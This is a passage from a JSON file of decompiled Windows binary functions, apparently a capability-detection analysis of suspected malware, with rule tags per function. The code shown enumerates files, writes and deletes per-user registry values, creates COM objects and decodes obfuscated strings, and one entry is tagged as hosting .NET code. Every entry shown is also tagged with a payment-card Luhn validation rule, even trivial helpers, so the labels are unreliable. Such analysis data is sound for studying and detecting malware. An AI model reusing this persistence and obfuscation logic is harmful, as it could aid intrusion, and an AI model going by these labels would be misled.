0x48;\ncode_r0x004104aa:\n                iVar2 = 4 - (uVar1 != 0);\n                goto code_r0x0041048d;\n            }\n            if (param_1 == 'u') {\n                *in_EAX = 6;\n                goto code_r0x0041052d;\n            }\n            if (param_1 != 'x') {\ncode_r0x004104fc:\n                *in_EAX = 0;\n                goto code_r0x0041052d;\n            }\n        }\ncode_r0x004104c8:\n        *in_EAX = 7;\n    }\ncode_r0x0041052d:\n    return *in_EAX;\n}\n",
        "token_count": 845
    },
    "00410e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410e70(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EDI;\n    \n    uVar3 = 0;\n    cVar1 = fcn.0040f84a(arg_8h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040f871(arg_ch, 0x40);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.0040ae05(0);\n            if (iVar2 != 0) {\n                iVar2 = fcn.0041224d(0xa8);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.00412505(arg_8h, unaff_EDI << 3, 0);\n                    if (iVar2 == 0) {\n                        fcn.0041278e(arg_ch);\n                    }\n                }\n                fcn.0040af12();\n            }\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 250
    },
    "00411219": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411219(uint32_t n)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *unaff_EDI;\n    uint s1;\n    \n    uVar2 = n;\n    if (n < unaff_EDI[1]) {\n        do {\n            *(*unaff_EDI + uVar2 * 4) = 0;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < unaff_EDI[1]);\n        unaff_EDI[1] = n;\n    }\n    else {\n        uVar2 = unaff_EDI[2];\n        if (uVar2 < n) {\n            iVar3 = fcn.0040ae05(0);\n            iVar1 = *unaff_EDI;\n            if (iVar3 == 0) {\n                fcn.004137fb();\n                fcn.0040af12();\n            }\n            sub.ntdll.dll_memcpy(iVar3, iVar1, uVar2 << 2);\n            fcn.004137fb();\n            fcn.0040af12();\n            *unaff_EDI = iVar3;\n            unaff_EDI[2] = n;\n        }\n        for (uVar2 = unaff_EDI[1]; uVar2 < n; uVar2 = uVar2 + 1) {\n            *(*unaff_EDI + uVar2 * 4) = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 333
    },
    "0041154c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041154c(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t n;\n    uint *unaff_ESI;\n    ulong uVar1;\n    \n    n = arg_10h[1];\n    if (arg_10h[1] < arg_ch[1]) {\n        n = arg_ch[1];\n    }\n    if (n < *(arg_8h + 4)) {\n        n = *(arg_8h + 4);\n    }\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00414515(*unaff_ESI, *arg_ch, *arg_10h);\n    uVar1 = fcn.0041379d(*unaff_ESI);\n    unaff_ESI[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 221
    },
    "004115ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004115ca(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t n;\n    uint *unaff_ESI;\n    ulong uVar1;\n    \n    n = arg_10h[1];\n    if (arg_10h[1] < arg_ch[1]) {\n        n = arg_ch[1];\n    }\n    if (n < arg_8h[1]) {\n        n = arg_8h[1];\n    }\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00411219(n);\n    fcn.00413cc2(*unaff_ESI, *arg_8h, *arg_ch, *arg_10h);\n    uVar1 = fcn.0041379d(*unaff_ESI);\n    unaff_ESI[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 222
    },
    "00411644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411644(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    ulong uVar2;\n    \n    puVar1 = arg_8h;\n    arg_8h = arg_ch[1];\n    if (arg_ch[1] <= in_EAX[1]) {\n        arg_8h = in_EAX[1];\n    }\n    fcn.00411219(arg_8h);\n    fcn.00411219(arg_8h);\n    fcn.00411219(arg_8h);\n    fcn.00413d17(*puVar1, *arg_ch, *in_EAX);\n    uVar2 = fcn.0041379d(*puVar1);\n    puVar1[1] = uVar2;\n    return uVar2 >> 0x20;\n}\n",
        "token_count": 194
    },
    "004116b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004116b0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    ulong uVar2;\n    \n    puVar1 = arg_8h;\n    arg_8h = arg_ch[1];\n    if (arg_ch[1] <= in_EAX[1]) {\n        arg_8h = in_EAX[1];\n    }\n    fcn.00411219(arg_8h);\n    fcn.00411219(arg_8h);\n    fcn.00411219(arg_8h);\n    fcn.00413f33(*puVar1, *arg_ch, *in_EAX);\n    uVar2 = fcn.0041379d(*puVar1);\n    puVar1[1] = uVar2;\n    return uVar2 >> 0x20;\n}\n",
        "token_count": 195
    },
    "0041182c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "enumerate files on windows"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041182c(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uchar auStack1640 [36];\n    uchar auStack1604 [548];\n    uchar auStack1056 [528];\n    uchar auStack528 [524];\n    \n    uVar6 = 0;\n    uVar3 = arg_8h;\n    uVar2 = fcn.0040acd8(0x418e70, 8, 0x8f23a918);\n    fcn.0040be75(auStack528, uVar2, uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(auStack528, auStack1640);\n    do {\n        uVar2 = arg_8h;\n        arg_ch_00 = fcn.0040acd8(0x418c10, 5, 0x27e55d8c, arg_8h, auStack1604);\n        fcn.0040be75(auStack1056, arg_ch_00, uVar2);\n        cVar1 = fcn.0041176c(auStack1056, arg_ch);\n        if (cVar1 != '\\0') {\n            uVar6 = 1;\n            break;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(uVar3, &stack0xfffff990);\n    } while (iVar4 != 0);\n    uVar5 = (*_sym.imp.KERNEL32.dll_FindClose)(uVar3);\n    return uVar5 & 0xffffff00 | uVar6;\n}\n",
        "token_count": 403
    },
    "004118de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: ppv\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.004118de(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    uint uVar3;\n    int32_t arg_ch_00;\n    int32_t unaff_EBP;\n    uint var_644h;\n    uint var_43ch;\n    uint s1;\n    uint var_28h;\n    uint ppv;\n    uint var_1dh;\n    uint var_4h;\n    \n    fcn.00415eec(0x4191e8, 0x634);\n    *(unaff_EBP + -0x1d) = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    cVar1 = fcn.0041182c(*(unaff_EBP + 8), arg_ch_00);\n    if (cVar1 == '\\0') {\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        iVar2 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4177e8, 0, 1, 0x4177c8, unaff_EBP + -0x24);\n        if (-1 < iVar2) {\n            *(unaff_EBP + -0x234) = 0;\n            sub.ntdll.dll_memset(unaff_EBP + -0x232, 0, 0x206);\n            iVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(arg_ch_00);\n            sub.ntdll.dll_memcpy(unaff_EBP + -0x234, arg_ch_00, iVar2 - arg_ch_00);\n            fcn.0040cc16(arg_ch_00, unaff_EBP + -0x43c);\n            uVar3 = *(unaff_EBP + 8);\n            arg_ch = fcn.0040acd8(0x418e7c, 9, 0x67a1a5e5, uVar3, unaff_EBP + -0x43c);\n            fcn.0040be75(unaff_EBP + -0x644, arg_ch, uVar3);\n            fcn.0040f36c(*(unaff_EBP + 8));\n            (**(**(unaff_EBP + -0x24) + 0x50))(*(unaff_EBP + -0x24), arg_ch_00);\n            (**(**(unaff_EBP + -0x24) + 0x24))(*(unaff_EBP + -0x24), unaff_EBP + -0x234);\n            uVar3 = fcn.0040cc7b(arg_ch_00, 6);\n            (**(**(unaff_EBP + -0x24) + 0x1c))(*(unaff_EBP + -0x24), uVar3);\n            fcn.0040af12();\n            *(unaff_EBP + -0x28) = 0;\n            iVar2 = (****(unaff_EBP + -0x24))(*(unaff_EBP + -0x24), 0x417808, unaff_EBP + -0x28);\n            if (-1 < iVar2) {\n                (**(**(unaff_EBP + -0x28) + 0x18))(*(unaff_EBP + -0x28), unaff_EBP + -0x644, 1);\n                (**(**(unaff_EBP + -0x28) + 8))(*(unaff_EBP + -0x28));\n                *(unaff_EBP + -0x1d) = 1;\n            }\n            (**(**(unaff_EBP + -0x24) + 8))(*(unaff_EBP + -0x24));\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x1d) = 1;\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 966
    },
    "00411a7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "enumerate files on windows"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411a7f(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint extraout_ECX;\n    uint32_t uVar6;\n    uchar auStack1644 [36];\n    uchar auStack1608 [548];\n    uchar auStack1060 [528];\n    uchar auStack532 [528];\n    \n    uVar6 = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    uVar3 = arg_ch;\n    uVar2 = fcn.0040acd8(0x418e70, 8, 0x8f23a918, extraout_ECX);\n    fcn.0040be75(auStack532, uVar2, uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(auStack532, auStack1644);\n    do {\n        uVar2 = arg_ch;\n        arg_ch_00 = fcn.0040acd8(0x418c10, 5, 0x27e55d8c, arg_ch, auStack1608);\n        fcn.0040be75(auStack1060, arg_ch_00, uVar2);\n        cVar1 = fcn.0041176c(auStack1060, arg_8h);\n        if (cVar1 != '\\0') {\n            iVar4 = fcn.0040cb5b();\n            uVar6 = iVar4 != 0;\n            break;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(uVar3, &stack0xfffff98c);\n    } while (iVar4 != 0);\n    (*_sym.imp.KERNEL32.dll_FindClose)(uVar3);\n    uVar5 = (*_sym.imp.ole32.dll_CoUninitialize)();\n    return uVar5 & 0xffffff00 | uVar6;\n}\n",
        "token_count": 458
    },
    "00411b4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411b4f(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    char cVar1;\n    int32_t iVar2;\n    uint var_208h;\n    \n    arg_8h_00 = arg_ch[1];\n    cVar1 = '\\0';\n    iVar2 = fcn.0040d302(arg_8h, &var_208h);\n    if (iVar2 != 0) {\n        cVar1 = fcn.00411a7f(arg_8h_00, &var_208h);\n    }\n    *arg_ch = *arg_ch + (cVar1 != '\\0');\n    return 0;\n}\n",
        "token_count": 162
    },
    "00411c03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00411c03(uint lpSubKey, uint arg_ch, int32_t lpString2, int32_t lpString1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_218h;\n    int32_t var_10h;\n    uint var_ch;\n    uint phkResult;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000003, lpSubKey, 0, 0x20119, &phkResult);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegEnumValueW;\n    if (uVar3 == 0) {\n        if (lpString2 == 0) {\n            var_10h = 0;\n            var_ch = 0x104;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegEnumValueW)(phkResult, 0, &var_218h, &var_ch, 0, 0, 0, 0);\n            while (iVar4 != 0x103) {\n                cVar2 = fcn.00411b9b(arg_ch, phkResult, &var_218h);\n                if (cVar2 != '\\0') {\n                    if (lpString1 != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, &var_218h);\n                    }\n                    var_1h._0_1_ = 1;\n                    break;\n                }\n                var_10h = var_10h + 1;\n                var_ch = 0x104;\n                iVar4 = (*pcVar1)(phkResult, var_10h, &var_218h, &var_ch, 0, 0, 0, 0);\n            }\n        }\n        else {\n            cVar2 = fcn.00411b9b(arg_ch, phkResult, lpString2);\n            if (cVar2 != '\\0') {\n                if (lpString1 != 0) {\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, lpString2);\n                }\n                var_1h._0_1_ = 1;\n            }\n        }\n        uVar3 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return uVar3 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 591
    },
    "00411de2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00411de2(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iStack1672;\n    uint uStack1668;\n    int32_t iStack1664;\n    uint uStack1660;\n    uchar *puStack1656;\n    int32_t iStack1652;\n    uchar auStack1648 [600];\n    uchar auStack1048 [520];\n    uchar auStack528 [524];\n    \n    puVar5 = auStack528;\n    fcn.0040cc16(arg_8h, puVar5);\n    iStack1672 = 0;\n    uVar2 = fcn.0040acd8(0x418f84, 4, 0xdbd66b73, puVar5);\n    iStack1652 = fcn.0040be75(auStack1048, uVar2, arg_8h);\n    iStack1652 = iStack1652 * 2;\n    iStack1664 = 0;\n    while( true ) {\n        cVar1 = fcn.00411d02();\n        if (cVar1 == '\\0') break;\n        uVar2 = arg_ch;\n        arg_ch_00 = fcn.0040acd8(0x418c10, 5, 0x27e55d8c, arg_ch, uStack1660);\n        fcn.0040be75(auStack1648, arg_ch_00, uVar2);\n        cVar1 = fcn.00411c03(auStack1648, auStack1048, puStack1656, 0);\n        if (cVar1 == '\\0') {\n            puVar5 = auStack528;\n            if (puStack1656 != NULL) {\n                puVar5 = puStack1656;\n            }\n            cVar1 = '\\0';\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)\n                              (0x80000003, auStack1648, 0, 0, 0, 0x20106, 0, &uStack1668, 0);\n            if (iVar3 == 0) {\n                puVar6 = auStack1048;\n                iVar3 = iStack1652;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(uStack1668, puVar5, 0, 1, puVar6, iStack1652);\n                cVar1 = '\\x01' - (iVar4 != 0);\n                (*_sym.imp.ADVAPI32.dll_RegFlushKey)(iVar3);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puVar6);\n            }\n            iStack1672 = iStack1672 + (cVar1 != '\\0');\n        }\n        else {\n            iStack1672 = iStack1672 + 1;\n        }\n        iStack1664 = iStack1664 + 1;\n    }\n    return iStack1672 != 0;\n}\n",
        "token_count": 701
    },
    "00411f66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00411f66(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint arg_10h;\n    uint uStack1144;\n    int32_t iStack1140;\n    uint uStack1136;\n    uint uStack1132;\n    uchar auStack1128 [600];\n    uchar auStack528 [524];\n    \n    iVar3 = 0;\n    iStack1140 = 0;\n    while( true ) {\n        cVar1 = fcn.00411d02();\n        if (cVar1 == '\\0') break;\n        arg_10h = arg_ch;\n        arg_ch_00 = fcn.0040acd8(0x418c10, 5, 0x27e55d8c, arg_ch, uStack1136);\n        fcn.0040be75(auStack1128, arg_ch_00, arg_10h);\n        cVar1 = fcn.00411c03(auStack1128, arg_8h, uStack1132, auStack528);\n        if (cVar1 != '\\0') {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)\n                              (0x80000003, auStack1128, 0, 0, 0, 0x20106, 0, &uStack1144, 0);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(uStack1144, auStack528);\n                iVar3 = iVar3 + (iVar2 == 0);\n                (*_sym.imp.ADVAPI32.dll_RegFlushKey)(unaff_EBX);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(unaff_ESI);\n            }\n        }\n        iStack1140 = iStack1140 + 1;\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 459
    },
    "00412041": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412041(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    piVar1 = arg_ch;\n    arg_8h_00 = arg_ch[1];\n    cVar2 = '\\0';\n    iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(arg_8h, &arg_ch);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00411f66(arg_8h_00, arg_ch);\n        (*_sym.imp.KERNEL32.dll_LocalFree)(arg_ch);\n    }\n    *piVar1 = *piVar1 + (cVar2 != '\\0');\n    return 0;\n}\n",
        "token_count": 190
    },
    "0041224d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041224d(uint32_t param_1)\n\n{\n    uint *unaff_ESI;\n    uint uStack12;\n    \n    if (unaff_ESI == NULL) {\n        uStack12 = 3;\n    }\n    else {\n        *0x41e404 = 1;\n        sub.ntdll.dll_memset();\n        unaff_ESI[0x5a] = 0;\n        *unaff_ESI = 0x200;\n        unaff_ESI[0x5b] = 0x40;\n        if (param_1 < 0x100) {\n            *0x41e874 = 0;\n            unaff_ESI[0x5c] = param_1;\n            unaff_ESI[0x43] = 1;\n            unaff_ESI[0x5d] = 1;\n            uStack12 = 0;\n        }\n        else {\n            uStack12 = 0x11;\n        }\n    }\n    return uStack12;\n}\n",
        "token_count": 222
    },
    "00412626": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00412626(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *unaff_ESI;\n    uchar *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0040a88f(0x419020, 0x10, 0xbf363896, 0);\n    if (unaff_ESI == NULL) {\n        uVar2 = 3;\n    }\n    else {\n        if (0 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3) {\n            piVar3 = unaff_ESI + 2;\n            puVar4 = unaff_ESI + 0x89;\n            do {\n                puVar4[-1] = *((*piVar3 >> 4) + iVar1);\n                *puVar4 = *((*piVar3 & 0xf) + iVar1);\n                piVar3 = piVar3 + 1;\n                puVar4 = puVar4 + 2;\n            } while ((-8 - unaff_ESI) + piVar3 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3);\n        }\n        *((*unaff_ESI + 3 + (*unaff_ESI + 3 >> 0x1f & 3U) >> 2) + 0x88 + unaff_ESI) = 0;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 372
    },
    "004128b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004128b1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    int16_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    while( true ) {\n        if (*0x41b038 + -0xe5 <= *0x41b038) {\n            return in_ECX;\n        }\n        if ((*0x41b038 | 0xf3) == 0) break;\n        iVar1 = iVar1 + 1;\n        if (3 < iVar1) {\n            *0x41b038 = arg_8h - 0xe7U | *0x41b038;\n            *0x41b038 = *0x41b038 & 0xffff0000 | *0x41b038 * 0xf7;\n            if ((arg_8h < *0x41b038) || (*0x41b038 * 0x2c < arg_8h * 0xef)) {\n                *0x41b038 = *0x41b038 << (*0x41b038 * 0xf7 & 0x1f);\n            }\n            else {\n                arg_8h._0_1_ = arg_ch * arg_8h;\n            }\n            return arg_8h + *0x41b038;\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 318
    },
    "004131e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004131e0(uint32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    if (param_4 != 0) {\n        param_2 = param_2 - param_1;\n        param_3 = param_3 - param_1;\n        do {\n            uVar2 = *(param_2 + param_1) + uVar1;\n            *param_1 = uVar2;\n            uVar1 = uVar2 < uVar1;\n            *param_1 = *param_1 + *(param_3 + param_1);\n            if (*param_1 < *(param_3 + param_1)) {\n                uVar1 = uVar1 + 1;\n            }\n            param_1 = param_1 + 1;\n            param_4 = param_4 + -1;\n        } while (param_4 != 0);\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "0041321b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041321b(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = arg_ch;\n    arg_ch = 0;\n    if (iVar2 != 0) {\n        iVar3 = in_EAX - in_ECX;\n        arg_8h = arg_8h - in_ECX;\n        do {\n            uVar1 = *(iVar3 + in_ECX) - arg_ch;\n            *in_ECX = uVar1;\n            arg_ch = -arg_ch - 1 < uVar1;\n            *in_ECX = *in_ECX - *(arg_8h + in_ECX);\n            uVar1 = -*(arg_8h + in_ECX) - 1;\n            if (uVar1 <= *in_ECX && *in_ECX != uVar1) {\n                arg_ch = arg_ch + 1;\n            }\n            in_ECX = in_ECX + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return arg_ch;\n}\n",
        "token_count": 279
    },
    "0041326c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041326c(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint *puVar4;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t *var_8h;\n    \n    iVar1 = arg_10h * 2;\n    puVar4 = in_EAX;\n    if (iVar1 != 0) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (arg_10h != 0) {\n        var_8h = in_EAX + arg_10h;\n        var_ch = in_EAX - arg_ch;\n        var_14h = arg_10h;\n        do {\n            uVar2 = 0;\n            if (*arg_ch == 0) {\n                *var_8h = 0;\n            }\n            else {\n                var_10h = 0;\n                puVar3 = var_ch + arg_ch;\n                do {\n                    fcn.00412944(&var_1ch);\n                    if (var_1ch + var_10h < var_10h) {\n                        var_18h = var_18h + 1;\n                    }\n                    var_1ch = var_1ch + var_10h + *puVar3;\n                    if (var_1ch < *puVar3) {\n                        var_18h = var_18h + 1;\n                    }\n                    *puVar3 = var_1ch;\n                    var_10h = var_18h;\n                    uVar2 = uVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                } while (uVar2 < arg_10h);\n                *var_8h = var_18h;\n            }\n            var_8h = var_8h + 1;\n            arg_ch = arg_ch + 1;\n            var_14h = var_14h - 1;\n        } while (var_14h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 538
    },
    "004137e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004137e3(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *in_EAX;\n    \n    if (param_2 != 0) {\n        param_3 = param_3 - in_EAX;\n        do {\n            *in_EAX = *(param_3 + in_EAX);\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00413a4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00413a4f(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = 0;\n    if (arg_ch == 0) {\n        if (in_ECX != 0) {\n            for (; in_ECX != 0; in_ECX = in_ECX + -1) {\n                *in_EAX = 0;\n                in_EAX = in_EAX + 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    else {\n        var_4h = in_ECX;\n        if (in_ECX != 0) {\n            do {\n                fcn.00412944(&var_ch);\n                *in_EAX = var_ch + uVar1;\n                if (var_ch + uVar1 < uVar1) {\n                    var_8h = var_8h + 1;\n                }\n                in_EAX = in_EAX + 1;\n                var_4h = var_4h + -1;\n                uVar1 = var_8h;\n            } while (var_4h != 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 305
    },
    "00413b9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413b9c(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    fcn.004137fb();\n    uVar1 = 0;\n    iVar4 = extraout_EDX + -1;\n    if (arg_ch != 0) {\n        do {\n            if (iVar4 < 0) {\n                return;\n            }\n            uVar5 = 0;\n            iVar3 = 0;\n            do {\n                if (0x1f < iVar3) break;\n                uVar2 = iVar3;\n                iVar3 = iVar3 + 8;\n                uVar5 = uVar5 | *(iVar4 + arg_10h) << (uVar2 & 0x1f);\n                iVar4 = iVar4 + -1;\n            } while (-1 < iVar4);\n            *(arg_8h + uVar1 * 4) = uVar5;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "00413c47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
